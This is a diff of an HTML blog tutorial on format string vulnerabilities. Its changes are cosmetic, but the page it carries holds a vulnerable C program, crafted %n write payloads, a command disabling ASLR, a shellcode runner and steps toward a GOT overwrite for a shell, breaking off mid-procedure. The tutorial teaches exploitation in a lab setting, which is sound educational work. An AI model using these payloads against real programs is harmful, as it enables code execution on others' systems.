@@ -1,9 +1,9 @@
-<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/me.svg"><meta name="generator" content="Astro v4.15.4"><!-- Canonical URL --><link rel="canonical" href="https://danielorihuela.dev/blog/format_string_vuln/"><!-- Primary Meta Tags --><title>Format string vulnerability</title><meta name="title" content="Format string vulnerability"><meta name="description" content="Learn how format string exploits work and discover preventive measures to safeguard your code against them."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://danielorihuela.dev/blog/format_string_vuln/"><meta property="og:title" content="Format string vulnerability"><meta property="og:description" content="Learn how format string exploits work and discover preventive measures to safeguard your code against them."><meta property="og:image" content="https://danielorihuela.dev/_astro/format-string-vuln.DlCIcyQp.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://danielorihuela.dev/blog/format_string_vuln/"><meta property="twitter:title" content="Format string vulnerability"><meta property="twitter:description" content="Learn how format string exploits work and discover preventive measures to safeguard your code against them."><meta property="twitter:image" content="https://danielorihuela.dev/_astro/format-string-vuln.DlCIcyQp.jpg"><!-- RSS --><link rel="alternate" type="application/rss+xml" title="Daniel Orihuela" href="https://danielorihuela.dev/feed.xml"><link rel="stylesheet" href="/_astro/about.IGnllL6P.css">
-<link rel="stylesheet" href="/_astro/_slug_.DgHCkA33.css">
+<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/me.svg"><meta name="generator" content="Astro v5.12.7"><!-- Canonical URL --><link rel="canonical" href="https://danielorihuela.dev/blog/format_string_vuln/"><!-- Primary Meta Tags --><title>Format string vulnerability</title><meta name="title" content="Format string vulnerability"><meta name="description" content="Learn how format string exploits work and discover preventive measures to safeguard your code against them."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://danielorihuela.dev/blog/format_string_vuln/"><meta property="og:title" content="Format string vulnerability"><meta property="og:description" content="Learn how format string exploits work and discover preventive measures to safeguard your code against them."><meta property="og:image" content="https://danielorihuela.dev/_astro/format-string-vuln.DlCIcyQp.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://danielorihuela.dev/blog/format_string_vuln/"><meta property="twitter:title" content="Format string vulnerability"><meta property="twitter:description" content="Learn how format string exploits work and discover preventive measures to safeguard your code against them."><meta property="twitter:image" content="https://danielorihuela.dev/_astro/format-string-vuln.DlCIcyQp.jpg"><!-- RSS --><link rel="alternate" type="application/rss+xml" title="Daniel Orihuela" href="https://danielorihuela.dev/feed.xml"><link rel="stylesheet" href="/_astro/about.BlhpPIz9.css">
+<link rel="stylesheet" href="/_astro/_slug_.JRAvWsf2.css">
 <style>img{margin:0 auto}div+h1{margin-top:0}h1,h2,h3,h4,h5,h6{margin-top:1em}
-</style><script type="module" src="/_astro/hoisted.DNq6m-fi.js"></script></head> <body class="bg-black bg-gradient-to-b from-black to-gray-900w-screen bg-black bg-gradient-to-b from-black to-gray-900"> <header class="px-4 py-0"> <nav class="fixed top-0 left-0 right-0 z-50 transition-all duration-500 bg-black/90 backdrop-blur-md border-b border-royalPurple/50"> <div class="max-w-7xl mx-auto px-6 lg:px-8"> <div class="flex items-center justify-between h-20">  <a href="/" class="text-2xl font-bold text-white hover:text-cyan-400 transition-colors duration-300"> <span class="text-royalPurple">&lt;</span>
+</style></head> <body class="bg-black bg-gradient-to-b from-black to-gray-900w-screen bg-black bg-gradient-to-b from-black to-gray-900"> <header class="px-4 py-0"> <nav class="fixed top-0 left-0 right-0 z-50 transition-all duration-500 bg-black/90 backdrop-blur-md border-b border-royalPurple/50"> <div class="max-w-7xl mx-auto px-6 lg:px-8"> <div class="flex items-center justify-between h-20">  <a href="/" class="text-2xl font-bold text-white hover:text-cyan-400 transition-colors duration-300"> <span class="text-royalPurple">&lt;</span>
 DO
-<span class="text-royalPurple">/&gt;</span> </a>  <div class="hidden md:flex items-center space-x-8"> <a href="/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Home <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/about/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> About <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/blog/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Blog <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/open-source/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Open Source <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a> </div>  <button id="mobile-menu-button" class="md:hidden text-white hover:text-cyan-400 transition-colors duration-300"> <svg id="menu-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" class="w-6 h-6"> <path id="menu-path" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path> </svg> </button> </div>  <div id="mobile-menu" class="md:hidden transition-all duration-300 overflow-hidden max-h-0 opacity-0"> <div class="py-4 space-y-2 bg-black/95 backdrop-blur-md rounded-lg mt-2 border border-purple-900/30"> <a href="/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Home </a><a href="/about/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> About </a><a href="/blog/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Blog </a><a href="/open-source/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Open Source </a> </div> </div> </div> </nav>  </header> <article class="my-32"> <div class="w-[80ch] max-w-full m-auto text-[#d3d3d3] bg-[#222222] rounded-2xl p-8 lg:p-12 border border-gray-600/30 shadow-2xl prose prose-xl prose-invert max-w-none"> <div class="w-96 max-w-full m-auto"> <img src="/_astro/format-string-vuln.DlCIcyQp_OjPKU.webp" class="rounded-xl shadow-ba" alt="" width="1024" height="1024" loading="lazy" decoding="async"> </div> <div class="py-4 text-center leading-none"> <div class="mb-2 text-[#ffffff]"> <time datetime="2024-01-29T00:00:00.000Z"> Jan 29, 2024 </time> </div> <h1 class="font-[Iceland]"> Format string vulnerability </h1> <hr> </div>  <ul>
+<span class="text-royalPurple">/&gt;</span> </a>  <div class="hidden md:flex items-center space-x-8"> <a href="/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Home <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/about/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> About <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/blog/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Blog <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/open-source/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Open Source <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a> </div>  <button id="mobile-menu-button" class="md:hidden text-white hover:text-cyan-400 transition-colors duration-300"> <svg id="menu-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" class="w-6 h-6"> <path id="menu-path" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path> </svg> </button> </div>  <div id="mobile-menu" class="md:hidden transition-all duration-300 overflow-hidden max-h-0 opacity-0"> <div class="py-4 space-y-2 bg-black/95 backdrop-blur-md rounded-lg mt-2 border border-purple-900/30"> <a href="/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Home </a><a href="/about/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> About </a><a href="/blog/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Blog </a><a href="/open-source/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Open Source </a> </div> </div> </div> </nav> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const n=document.getElementById("mobile-menu-button"),e=document.getElementById("menu-path");!n||!e||n.addEventListener("click",()=>{const t=document.getElementById("mobile-menu");t&&(t.classList.contains("max-h-0")?(t.classList.remove("max-h-0","opacity-0"),t.classList.add("max-h-96","opacity-100"),e.setAttribute("d","M6 18L18 6M6 6l12 12")):(t.classList.remove("max-h-96","opacity-100"),t.classList.add("max-h-0","opacity-0"),e.setAttribute("d","M4 6h16M4 12h16m-7 6h7")))})});</script> </header> <article class="my-32"> <div class="w-[80ch] max-w-full m-auto text-[#d3d3d3] bg-[#222222] rounded-2xl p-8 lg:p-12 border border-gray-600/30 shadow-2xl prose prose-xl prose-invert max-w-none"> <div class="w-96 max-w-full m-auto"> <img src="/_astro/format-string-vuln.DlCIcyQp_Z29SOSD.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="1024" height="1024" class="rounded-xl shadow-ba"> </div> <div class="py-4 text-center leading-none"> <div class="mb-2 text-[#ffffff]"> <time datetime="2024-01-29T00:00:00.000Z"> Jan 29, 2024 </time> </div> <h1 class="font-[Iceland]"> Format string vulnerability </h1> <hr> </div>  <ul>
 <li><a href="#whats-a-format-string-vulnerability">What’s a format string
 vulnerability?</a></li>
 <li><a href="#whats-the-problem">What’s the problem?</a></li>
@@ -28,8 +28,7 @@ make the program crash.</p>
 <p>The main problem is that the format string, when unchecked, let’s user
 insert format parameters to read and write memory addresses inside and
 before the stack. For example, let’s take the following C line of code.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#50FA7B">printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">hello </span><span style="color:#BD93F9">%x</span><span style="color:#BD93F9"> %x</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">3</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">7</span><span style="color:#F8F8F2">);</span></span>
-<span class="line"></span></code></pre>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#50FA7B">printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">hello </span><span style="color:#BD93F9">%x</span><span style="color:#BD93F9"> %x</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">3</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">7</span><span style="color:#F8F8F2">);</span></span></code></pre>
 <p>If we run it, the output will be <code>hello 3 7</code>. The parameters are pushed
 into the stack in reverse order. It pushes the 7, the 3, and the address
 of the format string. However, if we remove the 7 and rerun it, we will
@@ -67,14 +66,12 @@ the first address below the stack frame.</p>
 <span class="line"><span style="color:#50FA7B">   printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">[*] test_val @ 0x</span><span style="color:#BD93F9">%08x</span><span style="color:#F1FA8C"> = </span><span style="color:#BD93F9">%d</span><span style="color:#F1FA8C"> 0x</span><span style="color:#BD93F9">%08x</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">&#x26;</span><span style="color:#F8F8F2">test_val, test_val, test_val);</span></span>
 <span class="line"></span>
 <span class="line"><span style="color:#50FA7B">   exit</span><span style="color:#F8F8F2">(</span><span style="color:#BD93F9">0</span><span style="color:#F8F8F2">);</span></span>
-<span class="line"><span style="color:#F8F8F2">}</span></span>
-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
 <p>The code is quite self-explanatory. The vulnerable line of code is:
 <code>printf(text)</code>. Notice that it will print whatever the user feeds to it
 as input. We can pass any format string that we want. Before continuing,
 let’s see how to compile the program.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> fmt_vuln.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> fmt.out</span><span style="color:#BD93F9"> -fno-stack-protector</span><span style="color:#BD93F9"> -no-pie</span><span style="color:#BD93F9"> -m32</span></span>
-<span class="line"></span></code></pre>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> fmt_vuln.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> fmt.out</span><span style="color:#BD93F9"> -fno-stack-protector</span><span style="color:#BD93F9"> -no-pie</span><span style="color:#BD93F9"> -m32</span></span></code></pre>
 <ul>
 <li><code>-fno-stack-protector</code> to disable canaries</li>
 <li><code>-no-pie</code> to disable Position Independent Executable</li>
@@ -82,7 +79,7 @@ let’s see how to compile the program.</p>
 </ul>
 <p>Let’s continue with the exploit. The following image shows two
 executions.</p>
-<p><img  src="/_astro/print-input-vuln.COUbkaB4_G2yrf.webp" alt="" width="833" height="230" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="833" height="230" src="/_astro/print-input-vuln.COUbkaB4_ZecxRl.webp" ></p>
 <p>The first executions gets <code>"something"</code> as input. The output is the
 expected one. The interesting part is in the second execution, where we
 pass <code>$(printf "\x2c\xc0\x04\x08").%08x.%08x.%08x.%n</code> as input (the dots
@@ -100,7 +97,7 @@ containing <code>\x2c\xc0\x04\x08</code>. Therefore, <code>%n</code> overwrites 
 that memory address, which happens to be <code>test_val</code>.</p>
 <p>Similarly, if we increment the width of some of the format string
 parameters, we can overwrite <code>test_val</code> with higher values.</p>
-<p><img  src="/_astro/print-input-vuln-400.COjJOiJE_Z1z182c.webp" alt="" width="846" height="153" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="846" height="153" src="/_astro/print-input-vuln-400.COjJOiJE_21AzmG.webp" ></p>
 <p>That’s seemingly stupid thing is really powerful. We can overwrite
 memory addresses with whatever value we want (e.g another memory
 address). That’s the idea of the exploit. Let’s jump to the following
@@ -129,22 +126,20 @@ to
 <p>Great! We have the structure, but how do we compute the numbers for each
 <code>%x</code>?</p>
 <p>For the firts byte, we want to execute the command</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">./fmt.out</span><span style="color:#F8F8F2"> $(</span><span style="color:#8BE9FD">printf</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">\x2c\xc0\x04\x08JUNK\x2d\xc0\x04\x08JUNK\x2e\xc0\x04\x08JUNK\x2f\xc0\x04\x08</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">)</span><span style="color:#F1FA8C">.%08x.%08x.%08x.%n</span></span>
-<span class="line"></span></code></pre>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">./fmt.out</span><span style="color:#F8F8F2"> $(</span><span style="color:#8BE9FD">printf</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">\x2c\xc0\x04\x08JUNK\x2d\xc0\x04\x08JUNK\x2e\xc0\x04\x08JUNK\x2f\xc0\x04\x08</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">)</span><span style="color:#F1FA8C">.%08x.%08x.%08x.%n</span></span></code></pre>
 <p>which will give us the value of <code>test_val</code> (56). With that, we can
 compute the first number with the formula “expected value - initial
 value + 8”. That will give us the distance from the actual value stored
 in the variable to the value we want. The ”+ 8” comes from the 8 digits
 we are inserting in the <code>%08x</code> that appears before <code>%n</code>. We can compute
 this with gdb.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gdb</span><span style="color:#BD93F9"> -q</span><span style="color:#BD93F9"> --batch</span><span style="color:#BD93F9"> --ex</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">p 0xaa - 56 + 8</span><span style="color:#E9F284">"</span></span>
-<span class="line"></span></code></pre>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gdb</span><span style="color:#BD93F9"> -q</span><span style="color:#BD93F9"> --batch</span><span style="color:#BD93F9"> --ex</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">p 0xaa - 56 + 8</span><span style="color:#E9F284">"</span></span></code></pre>
 <p>Now, we can execute the following to get the first byte.</p>
-<p><img  src="/_astro/first-byte.DCKFw7bV_Z1XctRF.webp" alt="" width="1447" height="112" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1447" height="112" src="/_astro/first-byte.DCKFw7bV_Z4Agfw.webp" ></p>
 <p>For the following bytes, we have to do the same. However, to compute the
 numbers, we will use the formula “expected value - previous written
 value”.</p>
-<p><img  src="/_astro/ddccbbaa.CYNX11m6_8MlRJ.webp" alt="" width="1629" height="398" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1629" height="398" src="/_astro/ddccbbaa.CYNX11m6_2abqMg.webp" ></p>
 <p>Awesome! We know how to overwrite memory addresses, but we are rather
 limited. The bytes must be ordered in descending value. What if we want
 to write any arbitrary memory address? We cannot do something like
@@ -155,14 +150,14 @@ byte. In other words, instead of computing “expected value - previous
 written value” we will compute “1(expected value) - previous written
 value” (e.g. 0x1aa - 0xbb given that we want to write 0xaa). The
 procedure stays the same.</p>
-<p><img  src="/_astro/aaccaabb.BWZJPyYh_1takuB.webp" alt="" width="1645" height="437" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1645" height="437" src="/_astro/aaccaabb.BWZJPyYh_Z1NDMK.webp" ></p>
 <p>Amazing! But this is to much work, can’t we simplify it a little bit?</p>
 <h1 id="direct-access-and-short-writes">Direct access and short writes</h1>
 <p>There are two ways to simplify the process. First, we can use direct
 access to avoid writing numerous format parameters. We can use <code>%n$d</code>
 where <code>%n</code> indicates the argument position and <code>$d</code> indicates the format
 parameter type.</p>
-<p><img  src="/_astro/direct-access.DFiOP_Oi_2jWsAs.webp" alt="" width="469" height="113" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="469" height="113" src="/_astro/direct-access.DFiOP_Oi_vDzmo.webp" ></p>
 <p>We can simplify what we did in the previous section. Be aware that the
 structure changes a bit. We want to use
 <code>$(printf "{address 1}{address 2}{address 3}{address 4}")%{number 1}x%4\$n%{number 2}x%5\$n%{number 3}x%6\$n%{number 4}x%7\$n%</code>.
@@ -171,12 +166,12 @@ Notice that we no longer need:</p>
 <li>the padding between memory addresses</li>
 <li>to add 8 when computing the first value</li>
 </ul>
-<p><img  src="/_astro/direct-access-aaccaabb.CKs261TV_Z29gxSD.webp" alt="" width="1526" height="437" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1526" height="437" src="/_astro/direct-access-aaccaabb.CKs261TV_2uFDtK.webp" ></p>
 <p>But that’s not all. We can also use short writes to write two bytes at
 once. We need to use <code>%n$hd</code>, remove the second and fourth memory
 addresses, and compute the new values.</p>
-<p><img  src="/_astro/short-write.BNwfBMRz_Z1TKz1L.webp" alt="" width="1047" height="289" loading="lazy" decoding="async"></p>
-<p><img  src="/_astro/short-write-result.BC_uFMi9_DAlam.webp" alt="" width="506" height="45" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1047" height="289" src="/_astro/short-write.BNwfBMRz_Z9a8zQ.webp" ></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="506" height="45" src="/_astro/short-write-result.BC_uFMi9_1SI4Sz.webp" ></p>
 <p>Pretty neat, eh? With that knowledge, we could get a shell if we wanted
 to.</p>
 <h1 id="overwrite-global-offset-table-to-get-a-shell">Overwrite Global Offset Table to get a shell</h1>
@@ -185,14 +180,12 @@ holds the memory addresses of functions that are dinamically linked.
 It’s useful to call functions from shared libraries. We will rewrite a
 memory address there with the address of our shellcode, but first, let’s
 see how to compile the program.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> fmt_vuln.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> fmt.out</span><span style="color:#BD93F9"> -fno-stack-protector</span><span style="color:#BD93F9"> -no-pie</span><span style="color:#BD93F9"> -z</span><span style="color:#F1FA8C"> norelro</span><span style="color:#BD93F9"> -z</span><span style="color:#F1FA8C"> execstack</span><span style="color:#BD93F9"> -m32</span></span>
-<span class="line"></span></code></pre>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> fmt_vuln.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> fmt.out</span><span style="color:#BD93F9"> -fno-stack-protector</span><span style="color:#BD93F9"> -no-pie</span><span style="color:#BD93F9"> -z</span><span style="color:#F1FA8C"> norelro</span><span style="color:#BD93F9"> -z</span><span style="color:#F1FA8C"> execstack</span><span style="color:#BD93F9"> -m32</span></span></code></pre>
 <p>Notice that we added <code>-z norelro</code> to allow overwriting memory addresses
 in the GOT, and <code>-z execstack</code> to require executable stack.</p>
 <p>We also need to disable the Adress Space Layout Randomization (ASLR) to
 avoid random memory addreses.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#BD93F9"> 0</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> sudo</span><span style="color:#F1FA8C"> tee</span><span style="color:#F1FA8C"> /proc/sys/kernel/randomize_va_space</span></span>
-<span class="line"></span></code></pre>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#BD93F9"> 0</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> sudo</span><span style="color:#F1FA8C"> tee</span><span style="color:#F1FA8C"> /proc/sys/kernel/randomize_va_space</span></span></code></pre>
 <p>Now, the idea is pretty simple. We want to overwrite the memory address
 of the <code>exit</code> function in the GOT table. For that, we will need a couple
 of things.</p>
@@ -209,8 +202,7 @@ program. I got it from <a href="https://shell-storm.org/">https://shell-storm.or
 <span class="line"><span style="color:#50FA7B">  fprintf</span><span style="color:#F8F8F2">(stdout,</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">Length: </span><span style="color:#BD93F9">%d</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">,</span><span style="color:#50FA7B">strlen</span><span style="color:#F8F8F2">(shellcode));</span></span>
 <span class="line"><span style="color:#F8F8F2">  (</span><span style="color:#FF79C6">*</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">void</span><span style="color:#F8F8F2">(</span><span style="color:#FF79C6">*</span><span style="color:#F8F8F2">)()) shellcode)();</span></span>
 <span class="line"><span style="color:#FF79C6">  return</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">;</span></span>
-<span class="line"><span style="color:#F8F8F2">}</span></span>
-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
 <p>We also need a program to get the shellcode address. We will store in an
 environment variable.</p>
 <pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#FF79C6">#include</span><span style="color:#E9F284"> &#x3C;</span><span style="color:#F1FA8C">stdio.h</span><span style="color:#E9F284">></span></span>
@@ -227,19 +219,16 @@ environment variable.</p>
 <span class="line"><span style="color:#F8F8F2">  ptr </span><span style="color:#FF79C6">=</span><span style="color:#50FA7B"> getenv</span><span style="color:#F8F8F2">(argv[</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">]);</span><span style="color:#6272A4"> /* get env var location */</span></span>
 <span class="line"><span style="color:#F8F8F2">  ptr </span><span style="color:#FF79C6">+=</span><span style="color:#F8F8F2"> (</span><span style="color:#50FA7B">strlen</span><span style="color:#F8F8F2">(argv[</span><span style="color:#BD93F9">0</span><span style="color:#F8F8F2">]) </span><span style="color:#FF79C6">-</span><span style="color:#50FA7B"> strlen</span><span style="color:#F8F8F2">(argv[</span><span style="color:#BD93F9">2</span><span style="color:#F8F8F2">]))</span><span style="color:#FF79C6">*</span><span style="color:#BD93F9">2</span><span style="color:#F8F8F2">;</span><span style="color:#6272A4"> /* adjust for program name */</span></span>
 <span class="line"><span style="color:#50FA7B">  printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#BD93F9">%s</span><span style="color:#F1FA8C"> will be at </span><span style="color:#BD93F9">%p</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">, argv[</span><span style="color:#BD93F9">1</span><span style="color:#F8F8F2">], ptr);</span></span>
-<span class="line"><span style="color:#F8F8F2">}</span></span>
-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
 <p>From that point, the procedure is pretty straight forward.</p>
 <ol>
 <li>
 <p>Store shellcode in an environment variable</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FF79C6">export</span><span style="color:#BD93F9"> SHELLCODE</span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2">$(</span><span style="color:#50FA7B">cat</span><span style="color:#F1FA8C"> shellcode.bin</span><span style="color:#F8F8F2">)</span></span>
-<span class="line"></span></code></pre>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FF79C6">export</span><span style="color:#BD93F9"> SHELLCODE</span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2">$(</span><span style="color:#50FA7B">cat</span><span style="color:#F1FA8C"> shellcode.bin</span><span style="color:#F8F8F2">)</span></span></code></pre>
 </li>
 <li>
 <p>Get shellcode address</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">./getenv.out</span><span style="color:#F1FA8C"> SHELLCODE</span><span style="color:#F1FA8C"> ./fmt.out</span><span style="color:#F8F8F2"> </span></span>
-<span class="line"></span></code></pre>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">./getenv.out</span><span style="color:#F1FA8C"> SHELLCODE</span><span style="color:#F1FA8C"> ./fmt.out</span><span style="color:#F8F8F2"> </span></span></code></pre>
 </li>
 <li>
 <p>Compute the values we will put at the format string exploit for the
@@ -247,18 +236,16 @@ given shellcode address</p>
 <pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gdb</span><span style="color:#BD93F9"> -q</span><span style="color:#BD93F9"> --batch</span><span style="color:#BD93F9"> --ex</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">p 0xffff - 8</span><span style="color:#E9F284">"</span></span>
 <span class="line"><span style="color:#6272A4"># 65527</span></span>
 <span class="line"><span style="color:#50FA7B">gdb</span><span style="color:#BD93F9"> -q</span><span style="color:#BD93F9"> --batch</span><span style="color:#BD93F9"> --ex</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">p 0x1d9b8 - 0xffff</span><span style="color:#E9F284">"</span></span>
-<span class="line"><span style="color:#6272A4"># 55737</span></span>
